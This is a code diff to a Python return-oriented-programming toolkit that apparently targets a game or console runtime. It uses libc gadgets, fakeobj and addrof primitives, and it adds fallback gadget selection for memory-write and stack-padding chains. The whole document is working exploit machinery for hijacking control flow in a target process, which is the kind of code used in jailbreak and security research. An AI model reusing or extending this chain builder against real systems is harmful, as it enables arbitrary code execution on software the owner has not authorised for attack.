@@ -1,3 +1,4 @@
+import re
 import struct
 from types import FunctionType
 from constants import (
@@ -7,10 +8,37 @@ from constants import (
 )
 from offsets import LIBC_GADGETS
 from structure import StructureInstance
-from utils.ref import get_ref_addr, refbytearray
-from utils.etc import alloc, addrof, sizeof
-from utils.unsafe import readbuf, fakeobj
-from utils.pack import p64a
+from utils_ref import get_ref_addr, refbytearray
+from utils_etc import alloc, addrof, sizeof
+from utils_unsafe import readbuf, fakeobj
+from utils_pack import p64a
+
+# some games don't have "mov [rsi], rax; ret" as a gadget, fall back to rdi
+if "mov [rsi], rax; ret" in SELECTED_GADGETS:
+    STORE_RAX_REG = "rsi"
+elif "mov [rdi], rax; ret" in SELECTED_GADGETS:
+    STORE_RAX_REG = "rdi"
+else:
+    raise Exception("No gadget found to store rax into memory")
+
+STORE_RAX_POP_GADGET = "pop %s; ret" % STORE_RAX_REG
+STORE_RAX_GADGET = "mov [%s], rax; ret" % STORE_RAX_REG
+
+# Fall back to whatever "add rsp, <imm>; ret" (or standalone "ret <imm>") gadget exists
+# if "add rsp, 0x1b8; ret" is missing. "ret <imm>" pops its target before skipping, so it needs an extra "ret" slot first.
+_PADDING_GADGET_RE = re.compile(
+    r"^(?:add rsp, (0x[0-9a-fA-F]+); ret|ret (0x[0-9a-fA-F]+))$"
+)
+PADDING_GADGET = "add rsp, 0x1b8; ret"
+PADDING_FILLER_COUNT = 55
+PADDING_NEEDS_RET = False
+for _gadget_name in SELECTED_GADGETS:
+    _m = _PADDING_GADGET_RE.match(_gadget_name)
+    if _m:
+        PADDING_GADGET = _gadget_name
+        PADDING_FILLER_COUNT = int(_m.group(1) or _m.group(2), 16) // 8
+        PADDING_NEEDS_RET = _m.group(2) is not None
+        break
 
 
 def convert_regs_to_int(*regs):
@@ -131,28 +159,28 @@ class ROPChain(object):
         self.push_value(addr)
 
     def push_get_return_value(self):
-        self.push_gadget("pop rsi; ret")
+        self.push_gadget(STORE_RAX_POP_GADGET)
         self.push_value(self.return_value_addr)
-        self.push_gadget("mov [rsi], rax; ret")
+        self.push_gadget(STORE_RAX_GADGET)
 
     def push_get_errno(self):
         self.push_call(self.sc.libc_addr + SELECTED_LIBC["__error"])
-        self.push_gadget("pop rsi; ret")
+        self.push_gadget(STORE_RAX_POP_GADGET)
         self.push_value(self.errno_addr)
         self.push_gadget("mov rax, [rax]; ret")
-        self.push_gadget("mov [rsi], rax; ret")
+        self.push_gadget(STORE_RAX_GADGET)
 
     def push_write_into_memory(self, addr, value):
-        self.push_gadget("pop rsi; ret")
+        self.push_gadget(STORE_RAX_POP_GADGET)
         self.push_value(addr)
         self.push_gadget("pop rax; ret")
         self.push_value(value)
-        self.push_gadget("mov [rsi], rax; ret")
+        self.push_gadget(STORE_RAX_GADGET)
 
     def push_store_rax_into_memory(self, addr):
-        self.push_gadget("pop rsi; ret")
+        self.push_gadget(STORE_RAX_POP_GADGET)
         self.push_value(addr)
-        self.push_gadget("mov [rsi], rax; ret")
+        self.push_gadget(STORE_RAX_GADGET)
 
     def push_store_rdx_into_memory(self, addr):
         self.push_gadget("pop rcx; ret")
@@ -223,8 +251,10 @@ class Executable(object):
 
     def setup_padding_chain(self):
         # padding to align the stack
-        self.chain.push_gadget("add rsp, 0x1b8; ret")
-        for _ in range(55):
+        self.chain.push_gadget(PADDING_GADGET)
+        if PADDING_NEEDS_RET:
+            self.chain.push_gadget("ret")
+        for _ in range(PADDING_FILLER_COUNT):
             self.chain.push_value(0)
 
     def setup_post_chain(self):
